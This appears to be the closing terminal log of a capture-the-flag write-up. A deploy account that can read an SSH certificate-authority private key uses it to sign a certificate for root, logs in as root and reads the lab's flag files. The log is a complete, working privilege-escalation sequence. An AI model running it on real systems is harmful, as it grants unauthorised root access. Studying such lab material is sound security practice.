drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -t ed25519 -f /tmp/pwn -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/pwn
Your public key has been saved in /tmp/pwn.pub
The key fingerprint is:
SHA256:qGEkoFxXYUQ0vapiolSM8SfRi5TZyDraywLjHOZQTX8 svc-deploy@principal
The key's randomart image is:
+--[ED25519 256]--+
|.  . .=Oo        |
|o.o O . ..       |
|.o.X.+    .      |
|  Oo+ o.E.       |
| = *oo..S        |
|=+o.oo .         |
|Ooo . .          |
|o* + .           |
|o.= .            |
+----[SHA256]-----+
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from 2026-03-15T05:51:00 to 2026-03-15T06:52:01
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -L -f /tmp/pwn-cert.pub
/tmp/pwn-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:qGEkoFxXYUQ0vapiolSM8SfRi5TZyDraywLjHOZQTX8
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps (using rsa-sha2-512)
        Key ID: "pwn-root"
        Serial: 0
        Valid: from 2026-03-15T05:51:00 to 2026-03-15T06:52:01
        Principals: 
                root
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
svc-deploy@principal:/opt/principal/ssh$ ssh -i /tmp/pwn root@localhost
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@principal:~# ls
root.txt
root@principal:~# cat root.txt 
c7dbdab2...08dc
root@principal:~# cat /home/$USER/user.txt
cat: /home/root/user.txt: No such file or directory
root@principal:~# cat /home/svc-deploy/user.txt 
3479e83a...2b88
root@principal:~# 

```

<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
